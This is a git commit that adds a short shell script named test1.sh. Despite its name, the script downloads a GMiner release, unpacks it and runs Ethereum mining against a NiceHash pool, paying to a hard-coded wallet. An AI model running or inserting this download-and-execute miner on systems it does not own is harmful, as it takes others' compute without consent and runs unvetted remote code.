52cad71be5a9c51b011c6c11fda3e301f93761e7
loolzx <53612549+loolzx@users.noreply.github.com>
2021-09-02 01:59:31 +0700

    Create test1.sh
    awas lu gabisa

---
+++ test1.sh
@@ -0,0 +1,3 @@
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.54/gminer_2_54_linux64.tar.xz
+tar -xvf gminer_2_54_linux64.tar.xz
+./miner -a ethash -s daggerhashimoto.eu-west.nicehash.com:3353 --user 3BA43RbJwMKFnqb5i3Jm5p3N6PXsiwJhEr.001 --proto stratum
